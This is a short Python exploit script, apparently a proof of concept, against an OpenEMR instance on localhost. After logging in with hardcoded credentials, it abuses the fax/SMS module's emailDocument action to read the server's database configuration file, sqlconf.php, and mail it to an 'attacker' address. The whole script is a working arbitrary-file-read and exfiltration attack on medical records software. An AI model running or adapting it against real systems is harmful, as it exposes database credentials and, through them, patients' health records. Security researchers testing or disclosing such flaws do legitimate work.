import requests
target = "http://localhost:8080"
site = "default"
user = "NIU"
password = "Niu123@rezwan"
s = requests.Session()
s.get(f"{target}/interface/login/login.php", params={"site": site})
s.post(f"{target}/interface/main/main_screen.php",
       params={"auth": "login", "site": site},
       data={
           "new_login_session_management": "1",
           "authProvider": "Default",
           "authUser": user,
           "clearPass": password,
           "languageChoice": "1",
       })
r = s.get(f"{target}/interface/modules/custom_modules/oe-module-faxsms/index.php",
          params={
              "site": site,
              "type": "email",
              "_ACTION_COMMAND": "emailDocument",
              "email": "attacker@test.local",
              "body": "test",
              "file": "/var/www/localhost/htdocs/openemr/sites/default/sqlconf.php",
          })
print("STATUS:", r.status_code)
print("LEN:", len(r.text))
print("BODY:", repr(r.text[:1000]))
